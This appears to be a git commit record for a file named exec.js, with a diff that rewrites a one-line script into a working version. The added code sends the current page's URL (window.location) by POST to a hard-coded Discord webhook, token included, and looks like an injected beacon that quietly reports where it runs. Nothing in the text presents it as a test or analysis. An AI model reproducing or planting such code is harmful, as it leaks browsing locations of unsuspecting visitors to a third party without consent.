35a0fe8ceefd1408e0d973bf77e905259890c429
Ongenix <96583029+Ongenix@users.noreply.github.com>
2024-05-16 10:32:53 -0600

    Update exec.js

--- exec.js
+++ exec.js
@@ -1,1 +1,11 @@
-new XMLHttpRequest().open("POST", "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh", true), this.setRequestHeader("Content-Type", "application/json"), this.send(JSON.stringify({"content": window.location}));
+var xhr = new XMLHttpRequest();
+var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";
+
+xhr.open("POST", url, true);
+xhr.setRequestHeader("Content-Type", "application/json");
+
+var data = JSON.stringify({
+    "content": window.location
+});
+
+xhr.send(data);
